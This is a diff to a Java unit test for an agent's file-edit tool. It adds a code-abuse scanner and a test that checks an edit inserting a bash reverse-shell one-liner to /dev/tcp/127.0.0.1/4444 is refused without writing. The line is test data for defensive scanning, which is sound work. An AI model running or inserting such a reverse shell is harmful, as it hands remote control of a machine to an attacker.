@@ -11,6 +11,7 @@ import com.fasterxml.jackson.databind.JsonNode;
 import com.fasterxml.jackson.databind.ObjectMapper;
 import com.fasterxml.jackson.databind.node.ArrayNode;
 import com.fasterxml.jackson.databind.node.ObjectNode;
+import com.navneet.executespec.security.CodeAbuseScanner;
 import com.navneet.executespec.sse.SseBroadcaster;
 
 import org.junit.jupiter.api.BeforeEach;
@@ -38,7 +39,13 @@ class EditFileToolTest {
   @BeforeEach
   void setUp() {
     readState = new ReadFileStateStore();
-    tool = new EditFileTool(new FileSandboxPolicy(), mock(SseBroadcaster.class), readState, null);
+    tool =
+        new EditFileTool(
+            new FileSandboxPolicy(),
+            new CodeAbuseScanner(),
+            mock(SseBroadcaster.class),
+            readState,
+            null);
     ctx = new ExecutionContext("run-1", "T1", workspace);
   }
 
@@ -106,5 +113,21 @@ class EditFileToolTest {
             args("d.txt", new String[] {"alpha", "ALPHA"}, new String[] {"ZZZ", "zzz"}), ctx);
     assertThat(r).isInstanceOf(ToolResult.Err.class);
     assertThat(Files.readString(f)).isEqualTo("alpha\nbeta\n"); // nothing written
+  }
+
+  @Test
+  void code_abuse_scan_blocks_malicious_edit_without_writing() throws IOException {
+    Path f = writeAndRead("exploit.sh", "echo safe\n");
+
+    ToolResult r =
+        tool.execute(
+            args(
+                "exploit.sh",
+                new String[] {"echo safe", "bash -i >& /dev/tcp/127.0.0.1/4444 0>&1"}),
+            ctx);
+
+    assertThat(r).isInstanceOf(ToolResult.Err.class);
+    assertThat(((ToolResult.Err) r).kind()).isEqualTo(ToolResult.ErrorKind.FORBIDDEN);
+    assertThat(Files.readString(f)).isEqualTo("echo safe\n");
   }
 }
